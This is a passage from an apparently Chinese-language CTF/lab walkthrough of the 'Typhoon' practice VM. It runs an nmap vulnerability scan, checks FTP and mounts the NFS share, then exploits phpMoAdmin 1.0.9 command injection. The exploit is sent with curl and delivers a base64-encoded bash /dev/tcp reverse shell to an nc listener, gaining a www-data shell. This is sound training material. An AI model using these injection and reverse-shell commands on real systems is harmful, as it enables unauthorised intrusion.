class="hljs-keyword">for</span> 192.168.56.121<br>Host is up (0.00013s latency).<br><br>PORT      STATE SERVICE<br>21/tcp    open  ftp<br>22/tcp    open  ssh<br>25/tcp    open  smtp<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use anonymous<br>|       Diffie-Hellman key exchange only provide protection against passive<br>|       eavesdropping, and are vulnerable to active man-in-the-middle attacks<br>|       <span class="hljs-built_in">which</span> could completely compromise the confidentiality and integrity<br>|       of any data exchanged over the resulting session.<br>|     Check results:<br>|       ANONYMOUS DH GROUP 1<br>|             Cipher Suite: TLS_DH_anon_WITH_SEED_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: postfix <span class="hljs-built_in">builtin</span><br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|       https://www.ietf.org/rfc/rfc2246.txt<br>|   <br>|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)<br>|     State: VULNERABLE<br>|     IDs:  CVE:CVE-2015-4000  BID:74733<br>|       The Transport Layer Security (TLS) protocol contains a flaw that is<br>|       triggered when handling Diffie-Hellman key exchanges defined with<br>|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker<br>|       to downgrade the security of a TLS session to 512-bit export-grade<br>|       cryptography, <span class="hljs-built_in">which</span> is significantly weaker, allowing the attacker<br>|       to more easily <span class="hljs-built_in">break</span> the encryption and monitor or tamper with<br>|       the encrypted stream.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2015-5-19<br>|     Check results:<br>|       EXPORT-GRADE DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 512<br>|             Generator Length: 8<br>|             Public Key Length: 512<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000<br>|       https://www.securityfocus.com/bid/74733<br>|       https://weakdh.org<br>|   <br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_SEED_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: postfix <span class="hljs-built_in">builtin</span><br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2014-3566  BID:70574<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|       TLS_FALLBACK_SCSV properly implemented<br>|     References:<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.securityfocus.com/bid/70574<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>| smtp-vuln-cve2010-4344: <br>|_  The SMTP server is not Exim: NOT VULNERABLE<br>53/tcp    open  domain<br>80/tcp    open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|_  /phpmyadmin/: phpMyAdmin</span><br><span class="hljs-string">| http-fileupload-exploiter: </span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|     Couldn&#x27;</span>t find a file-type field.<br>|   <br>|_    Couldn<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">110/tcp   open  pop3</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_SEED_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|       TLS_FALLBACK_SCSV properly implemented</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">111/tcp   open  rpcbind</span><br><span class="hljs-string">139/tcp   open  netbios-ssn</span><br><span class="hljs-string">143/tcp   open  imap</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|       TLS_FALLBACK_SCSV properly implemented</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_SEED_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">445/tcp   open  microsoft-ds</span><br><span class="hljs-string">631/tcp   open  ipp</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>993/tcp   open  imaps<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2014-3566  BID:70574<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|       TLS_FALLBACK_SCSV properly implemented<br>|     References:<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.securityfocus.com/bid/70574<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_SEED_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>995/tcp   open  pop3s<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2014-3566  BID:70574<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|       TLS_FALLBACK_SCSV properly implemented<br>|     References:<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.securityfocus.com/bid/70574<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_SEED_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>2049/tcp  open  nfs<br>3306/tcp  open  mysql<br>5432/tcp  open  postgresql<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2014-3566  BID:70574<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|       TLS_FALLBACK_SCSV properly implemented<br>|     References:<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.securityfocus.com/bid/70574<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_SEED_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>6379/tcp  open  redis<br>8080/tcp  open  http-proxy<br>| http-enum: <br>|   /examples/: Sample scripts<br>|   /manager/html/upload: Apache Tomcat (401 Unauthorized)<br>|   /manager/html: Apache Tomcat (401 Unauthorized)<br>|_  /docs/: Potentially interesting folder<br>27017/tcp open  mongod<br>34114/tcp open  unknown<br>34329/tcp open  unknown<br>41559/tcp open  unknown<br>43004/tcp open  unknown<br>49357/tcp open  unknown<br>MAC Address: 08:00:27:2D:C0:8F (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>|_smb-vuln-ms10-054: <span class="hljs-literal">false</span><br>|_smb-vuln-ms10-061: <span class="hljs-literal">false</span><br>| smb-vuln-regsvc-dos: <br>|   VULNERABLE:<br>|   Service regsvc <span class="hljs-keyword">in</span> Microsoft Windows systems vulnerable to denial of service<br>|     State: VULNERABLE<br>|       The service regsvc <span class="hljs-keyword">in</span> Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference<br>|       pointer. This script will crash the service <span class="hljs-keyword">if</span> it is vulnerable. This vulnerability was discovered by Ron Bowes<br>|       <span class="hljs-keyword">while</span> working on smb-enum-sessions.<br>|_          <br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 333.29 seconds<br></code></pre></td></tr></table></figure>
+
+<p>先从简单的开始尝试吧</p>
+<h2 id="21-端口匿名登录"><a href="#21-端口匿名登录" class="headerlink" title="21 端口匿名登录"></a>21 端口匿名登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ ftp 192.168.56.121<br>Connected to 192.168.56.121.<br>220 (vsFTPd 3.0.2)<br>Name (192.168.56.121:kali): anonymous<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; binary<br>200 Switching to Binary mode.<br>ftp&gt; <span class="hljs-built_in">ls</span> -liah<br>229 Entering Extended Passive Mode (|||6562|).<br>150 Here comes the directory listing.<br>drwxr-xr-x    2 0        129          4096 Oct 23  2018 .<br>drwxr-xr-x    2 0        129          4096 Oct 23  2018 ..<br>226 Directory send OK.<br></code></pre></td></tr></table></figure>
+
+<p>没有文件，但或许可以上传？试一试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; binary<br>200 Switching to Binary mode.<br>ftp&gt; put test.txt<br><span class="hljs-built_in">local</span>: test.txt remote: test.txt<br>229 Entering Extended Passive Mode (|||60611|).<br>553 Could not create file.<br></code></pre></td></tr></table></figure>
+
+<p>不能创建文件，暂时没思路，看看别的端口</p>
+<h2 id="2049-端口-nfs"><a href="#2049-端口-nfs" class="headerlink" title="2049 端口 nfs"></a>2049 端口 nfs</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ showmount -e 192.168.56.121                 <br>Export list <span class="hljs-keyword">for</span> 192.168.56.121:<br>/typhoon *<br>┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ sudo mount -t nfs 192.168.56.121:/typhoon /tmp/infosec<br>┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">ls</span> -liah<br>total 28K<br> 923939 drwxr-xr-x  2 root root 4.0K Oct 22  2018 .<br>4194305 drwxrwxrwt 17 root root  12K Jul  2 08:39 ..<br> 923940 -rw-r--r--  1 root root   24 Oct 22  2018 .secret<br> 923941 -rw-r--r--  1 root root   63 Oct 24  2018 secret<br> 923942 -rw-------  1 root root 1.8K Oct 22  2018 .secret.rsa<br></code></pre></td></tr></table></figure>
+
+<p>目录下有三个文件，依次查看，不过 <code>.secret.rsa</code> 没有查看权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">cat</span> .secret    <br>belong to typhoon user.<br><br>┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">cat</span> secret <br><span class="hljs-built_in">test</span> file<br>&lt;rec0nm4st3r&gt; R3c0n_m4steeeee3er_fl4g &lt;/rec0nm4st3r&gt;<br>┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">cat</span> .secret.rsa <br><span class="hljs-built_in">cat</span>: .secret.rsa: Permission denied<br></code></pre></td></tr></table></figure>
+
+<p>leet 网络用语，还原后得到 <code>recon_master_flag</code>，emmmm 看来只是个彩蛋。那看来 nfs 也没什么收获，这个权限有限的文件，等 getshell 后或许可以考虑。</p>
+<h2 id="80-端口"><a href="#80-端口" class="headerlink" title="80 端口"></a>80 端口</h2><p>nmap 的扫描结果中，80 端口有个 robots.txt 文件，其中给了&#x2F;mongoadmin&#x2F;这样一个路径，看看吧</p>
+<p><img src="/pic/ede0fe412ccfa5048136ba76eb19ea4a_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>首页没什么东西，感觉是个广告，源码里也没收获。看看 mongoadmin 目录</p>
+<p><img src="/pic/219f294b6eb93236b79f18011d8156e1_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>似乎是个可视化的管理工具，点击 stats 得到如下的信息：</p>
+<p><img src="/pic/b0c248169e8b56f98f95613301054fb0_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="phpMoAdmin-漏洞"><a href="#phpMoAdmin-漏洞" class="headerlink" title="phpMoAdmin 漏洞"></a>phpMoAdmin 漏洞</h2><p>里面给出了 <code>phpMoAdmin: 1.0.9</code>，搜一搜有没有漏洞</p>
+<p><img src="/pic/710cea9afc74812a7e9849adb1a8ca21_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一个链接给出了利用方法，这里只摘出 PoC</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://path.to/moadmin.php&quot;</span> -d <span class="hljs-string">&quot;object=1;system(&#x27;id&#x27;);exit&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来替换其中的命令尝试反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools]<br>└─$ curl <span class="hljs-string">&quot;http://192.168.56.121/mongoadmin/index.php&quot;</span> -d <span class="hljs-string">&quot;object=1;system(&#x27;cd /tmp;/bin/bash -c &quot;</span>bash -i &gt;&amp; /dev/tcp/192.168.56.106/4242 0&gt;&amp;1<span class="hljs-string">&quot;&#x27;);exit&quot;</span><br>zsh: no such file or directory: /dev/tcp/192.168.56.106/4242<br></code></pre></td></tr></table></figure>
+
+<p>失败，应该是其中某些字符的问题，那就尝试 base64 编码再解码吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.106/4242 0&gt;&amp;1&quot;&#x27;</span> |<span class="hljs-built_in">base64</span><br>L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTA2LzQyNDIgMD4m<br>MSIK<br>                                                                                                                    <br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTA2LzQyNDIgMD4mMSIK&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>/bin/bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.106/4242 0&gt;&amp;1&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="base64编码以-getshell"><a href="#base64编码以-getshell" class="headerlink" title="base64编码以 getshell"></a>base64编码以 getshell</h2><p>将编码再解码的结果通过管道传递给 bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools]<br>└─$ curl <span class="hljs-string">&quot;http://192.168.56.121/mongoadmin/index.php&quot;</span> -d <span class="hljs-string">&quot;object=1;system(&#x27;echo &quot;</span>L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTA2LzQyNDIgMD4mMSIK<span class="hljs-string">&quot; | base64 -d | bash&#x27;);exit&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>提前开启监听，反弹 shell 成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 4242<br>listening on [any] 4242 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.121] 53121<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (2151): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@typhoon:/var/www/html/mongoadmin$ <br>www-data@typhoon:/var/www/html/mongoadmin$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@typhoon:/var/www/html/mongoadmin$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>index.php<br>www-data@typhoon:/var/www/html/mongoadmin$ ip a  <br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:2d:c0:8f brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.121/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe2d:c08f/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br>    <span 